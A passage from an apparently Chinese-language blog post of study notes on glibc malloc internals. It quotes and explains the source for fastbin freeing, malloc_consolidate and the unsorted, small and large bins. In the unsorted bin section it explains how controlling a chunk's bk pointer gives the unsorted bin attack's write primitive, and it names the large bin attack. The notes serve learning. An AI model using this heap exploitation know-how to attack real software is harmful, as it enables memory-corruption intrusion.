合并。</strong></p><p>free中的fastbin相关的处理源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(<span class="built_in">size</span>) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast ())</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">    ## 对<span class="built_in">size</span>进行基本的检查</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunk_at_offset (p, <span class="built_in">size</span>)-&gt;<span class="built_in">size</span> &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (chunksize (chunk_at_offset (p, <span class="built_in">size</span>))</span><br><span class="line">                 &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">    ...</span><br><span class="line">    ## 对next chunk的<span class="built_in">size</span>进行检查</span><br><span class="line">    <span class="keyword">if</span> (chunk_at_offset (p, <span class="built_in">size</span>)-&gt;<span class="built_in">size</span> &lt;= <span class="number">2</span> * SIZE_SZ</span><br><span class="line">            || chunksize (chunk_at_offset (p, <span class="built_in">size</span>)) &gt;= av-&gt;system_mem;</span><br><span class="line">          &#125;))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"free(): invalid next size (fast)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    ## 获取对应的fastbin index</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index(<span class="built_in">size</span>);</span><br><span class="line">    fb = &amp;fastbin (av, idx);</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">    <span class="comment">/* Check that the top of the bin is not the record we are going to add</span></span><br><span class="line"><span class="comment">       (i.e., double free).  */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"double free or corruption (fasttop)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">      ...</span><br><span class="line">    p-&gt;fd = old2 = old;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>对于fastbin的free过程主要包括如下：</p><ol><li><p>对释放的堆块的size进行基本的检查。</p></li><li><p>对释放堆块的下一个堆块的size进行基本的检查。</p></li><li><p>获取释放堆块所对应的fastbin链表对应的索引。</p></li><li><p>检查是否是double free。</p></li><li><p>释放进单链表。</p></li></ol><h5 id="malloc-consolidate"><a href="#malloc-consolidate" class="headerlink" title="malloc_consolidate()"></a>malloc_consolidate()</h5><p>是free()的一个小的变体，专门用来处理fastbin中的空先chunk，它同时还负责堆管理的初始化工作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  ------------------------- malloc_consolidate -------------------------</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  malloc_consolidate is a specialized version of free() that tears</span></span><br><span class="line"><span class="comment">  down chunks held in fastbins.  Free itself cannot be used for this</span></span><br><span class="line"><span class="comment">  purpose since, among other things, it might place chunks back onto</span></span><br><span class="line"><span class="comment">  fastbins.  So, instead, we need to use a minor variant of the same</span></span><br><span class="line"><span class="comment">  code.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Also, because this routine needs to be called the first time through</span></span><br><span class="line"><span class="comment">  malloc anyway, it turns out to be the perfect place to trigger</span></span><br><span class="line"><span class="comment">  initialization code.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">malloc_consolidate</span><span class="params">(mstate av)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  mfastbinptr*    fb;                 <span class="comment">/* current fastbin being consolidated */</span></span><br><span class="line">  mfastbinptr*    maxfb;              <span class="comment">/* last fastbin (for loop control) */</span></span><br><span class="line">  mchunkptr       p;                  <span class="comment">/* current chunk being consolidated */</span></span><br><span class="line">  mchunkptr       nextp;              <span class="comment">/* next chunk to consolidate */</span></span><br><span class="line">  mchunkptr       unsorted_bin;       <span class="comment">/* bin header */</span></span><br><span class="line">  mchunkptr       first_unsorted;     <span class="comment">/* chunk to link to */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* These have same use as in free() */</span></span><br><span class="line">  mchunkptr       nextchunk;</span><br><span class="line">  INTERNAL_SIZE_T <span class="built_in">size</span>;</span><br><span class="line">  INTERNAL_SIZE_T nextsize;</span><br><span class="line">  INTERNAL_SIZE_T prevsize;</span><br><span class="line">  <span class="keyword">int</span>             nextinuse;</span><br><span class="line">  mchunkptr       bck;</span><br><span class="line">  mchunkptr       fwd;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If max_fast is 0, we know that av hasn't</span></span><br><span class="line"><span class="comment">    yet been initialized, in which case do so below</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (get_max_fast () != <span class="number">0</span>) &#123;</span><br><span class="line">    clear_fastchunks(av);</span><br><span class="line"></span><br><span class="line">    unsorted_bin = unsorted_chunks(av);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Remove each chunk from fast bin and consolidate it, placing it</span></span><br><span class="line"><span class="comment">      then in unsorted bin. Among other reasons for doing this,</span></span><br><span class="line"><span class="comment">      placing in unsorted bin avoids needing to calculate actual bins</span></span><br><span class="line"><span class="comment">      until malloc is sure that chunks aren't immediately going to be</span></span><br><span class="line"><span class="comment">      reused anyway.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    maxfb = &amp;fastbin (av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">    fb = &amp;fastbin (av, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      p = atomic_exchange_acq (fb, <span class="literal">NULL</span>);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      check_inuse_chunk(av, p);</span><br><span class="line">      nextp = p-&gt;fd;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">      <span class="built_in">size</span> = p-&gt;<span class="built_in">size</span> &amp; ~(PREV_INUSE|NON_MAIN_ARENA);</span><br><span class="line">      nextchunk = chunk_at_offset(p, <span class="built_in">size</span>);</span><br><span class="line">      nextsize = chunksize(nextchunk);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">        prevsize = p-&gt;prev_size;</span><br><span class="line">        <span class="built_in">size</span> += prevsize;</span><br><span class="line">        p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">        unlink(av, p, bck, fwd);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">        nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">          <span class="built_in">size</span> += nextsize;</span><br><span class="line">          unlink(av, nextchunk, bck, fwd);</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">          clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">        unsorted_bin-&gt;fd = p;</span><br><span class="line">        first_unsorted-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (<span class="built_in">size</span>)) &#123;</span><br><span class="line">          p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">          p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        set_head(p, <span class="built_in">size</span> | PREV_INUSE);</span><br><span class="line">        p-&gt;bk = unsorted_bin;</span><br><span class="line">        p-&gt;fd = first_unsorted;</span><br><span class="line">        set_foot(p, <span class="built_in">size</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">size</span> += nextsize;</span><br><span class="line">        set_head(p, <span class="built_in">size</span> | PREV_INUSE);</span><br><span class="line">        av-&gt;top = p;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">while</span> ( (p = nextp) != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    malloc_init_state(av);</span><br><span class="line">    check_malloc_state(av);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/Plus_RE/article/details/79265805" target="_blank" rel="noopener">参考</a></p><h4 id="small-bins"><a href="#small-bins" class="headerlink" title="small bins"></a>small bins</h4><p>个数为62个</p><p>  在32位系统中，small bins里的chunk大小从16到504字节；在64位系统中，small bins里的chunk大小从32到1016字节。</p><p>将申请的内存大小加上每个chunk的overhead，也就是chunk结构体里的size字段。然后对齐，就是需要分配的chunk的大小。</p><p>chunk&lt;1024bytes(64bit)[0x400]  chun_size=2<em>SIZE_SZ</em>index</p><p>双向链表</p><p>在64位系统中，malloc(88)= 0x88+8=0x90</p><h4 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h4><p>large bins 中一共包括 63 个 bin，每个 bin 中的 chunk 的大小不一致，而是处于一定区间范围内。此外，这 63 个 bin 被分成了 6 组，每组 bin 中的 chunk 大小之间的公差一致，具体如下：</p><table><thead><tr><th align="left">组</th><th align="left">数量</th><th align="left">公差</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">32</td><td align="left">64B</td></tr><tr><td align="left">2</td><td align="left">16</td><td align="left">512B</td></tr><tr><td align="left">3</td><td align="left">8</td><td align="left">4096B</td></tr><tr><td align="left">4</td><td align="left">4</td><td align="left">32768B</td></tr><tr><td align="left">5</td><td align="left">2</td><td align="left">262144B</td></tr><tr><td align="left">6</td><td align="left">1</td><td align="left">不限制</td></tr></tbody></table><p>这里我们以 32 位平台的 large bin 为例，第一个 large bin 的起始 chunk 大小为 512 字节，位于第一组，所以该 bin 可以存储的 chunk 的大小范围为 [512,512+64)。</p><p>关于 large bin 的宏如下，这里我们以 32 位平台下，第一个 large bin 的起始 chunk 大小为例，为 512 字节，那么 512&gt;&gt;6 = 8，所以其下标为 56+8=64。</p><h4 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Unsorted chunks</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    All remainders from chunk splits, as well as all returned chunks,</span></span><br><span class="line"><span class="comment">    are first placed in the "unsorted" bin. They are then placed</span></span><br><span class="line"><span class="comment">    in regular bins after malloc gives them ONE chance to be used before</span></span><br><span class="line"><span class="comment">    binning. So, basically, the unsorted_chunks list acts as a queue,</span></span><br><span class="line"><span class="comment">    with chunks being placed on it in free (and malloc_consolidate),</span></span><br><span class="line"><span class="comment">    and taken off (to be either used or placed in bins) in malloc.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The NON_MAIN_ARENA flag is never set for unsorted chunks, so it</span></span><br><span class="line"><span class="comment">    does not have to be taken into account in size comparisons.</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>unsorted bin 处于我们之前所说的 bin 数组下标 1 处。故而 unsorted bin 只有一个链表。unsorted bin 中的空闲 chunk 处于乱序状态，主要有两个来源</p><ul><li><p>当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。</p></li><li><p>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中</p><p>  Unsorted Bin 在使用的过程中，采用的遍历顺序时FIFO(链表的操作先进先出（即后来的节点在尾部）)，即一个chunk放入unsorted bin 链时将该堆块插入链表头，从而者个链取堆块的时候是从尾部开始的，因此unsorted bin遍历堆块的时候使用的是bk指针。</p><p>  分析源码</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">从下面源码可以看出首先取链表尾部的chunk记作victim，倒数第二个chunk记作bck，首先要对victim的<span class="built_in">size</span>位进行检查，这个约束比较宽松，计算得到chunk实际大小。一个代码块是假如我们申请的chunk属于small bin的范围，且last remainder是unsorted bin的唯一一个chunk时，我们优先使用这个块，如果该块满足条件则对其进行切割和解链操作。</span><br><span class="line"></span><br><span class="line">如果上述条件不满足，则将victim从链中取出之后放到合适的链中或返回给用户。其中unsorted_chunks (av)-&gt;bk = bck;bck-&gt;fd = unsorted_chunks (av);是unsorted bin attack产生的原因，一旦我们绕过之前的检查到达这里，在可以控制victim-&gt;bk即bck的情况下我们可以往bck-&gt;fd写入unsorted_chunks(av)即*(bck+<span class="number">0x10</span>)=unsorted(av)。</span><br><span class="line"></span><br><span class="line">继续走，下面一个代码块是指如果我们请求的nb同victim的大小恰好吻合，就直接返回这个块给用户。</span><br><span class="line"></span><br><span class="line">如果之前的条件都不满足，意味着目前的victim不能满足用户的需求，需要根据其<span class="built_in">size</span>放入small bin或large bin的链，其中在后者实现中存在large bin attack，由于同本文无关就不再进一步展开，最后是unlink将victim彻底解链。</span><br></pre></td></tr></table></figure>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          <span class="comment">//size check</span></span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (victim-&gt;<span class="built_in">size</span> &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (victim-&gt;<span class="built_in">size</span> &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">"malloc(): memory corruption"</span>,</span><br><span class="line">                             chunk2mem (victim), av);</span><br><span class="line">          <span class="built_in">size</span> = chunksize (victim);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">             only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">             runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">             exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">             no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line">          <span class="comment">//last remainder first</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (<span class="built_in">size</span>) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">              remainder_size = <span class="built_in">size</span> - nb;</span><br><span class="line">              remainder = chunk_at_offset (victim, nb);</span><br><span class="line">              <span class="comment">//cut and put the remained part back to unsorted list</span></span><br><span class="line">              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">              av-&gt;last_remainder = remainder;</span><br><span class="line">              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">              <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                  remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">              set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">              set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="comment">//return to user</span></span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          <span class="comment">//unsorted bin attack</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (<span class="built_in">size</span> == nb)</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, <span class="built_in">size</span>);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;<span class="built_in">size</span> |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (<span class="built_in">size</span>))</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (<span class="built_in">size</span>);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (<span class="built_in">size</span>);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  <span class="built_in">size</span> |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert ((bck-&gt;bk-&gt;<span class="built_in">size</span> &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (<span class="built_in">size</span>) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (bck-&gt;bk-&gt;<span class="built_in">size</span>))</span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      assert ((fwd-&gt;<span class="built_in">size</span> &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                      <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) <span class="built_in">size</span> &lt; fwd-&gt;<span class="built_in">size</span>)</span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                          assert ((fwd-&gt;<span class="built_in">size</span> &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) <span class="built_in">size</span> == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) fwd-&gt;<span class="built_in">size</span>)</span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          mark_bin (av, victim_index);</span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line">          <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></li></ul><pre><code>**一个宏****根据 chunk 的大小统一地获得 chunk 所在的索引**<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define bin<span class="constructor">_index(<span class="params">sz</span>)</span>                                                          \</span><br><span class="line">    ((<span class="keyword">in</span><span class="constructor">_smallbin_range(<span class="params">sz</span>)</span>) ? smallbin<span class="constructor">_index(<span class="params">sz</span>)</span> : largebin<span class="constructor">_index(<span class="params">sz</span>)</span>)</span><br></pre></td></tr></table></figure></code></pre><h3 id="libc-malloc"><a href="#libc-malloc" class="headerlink" 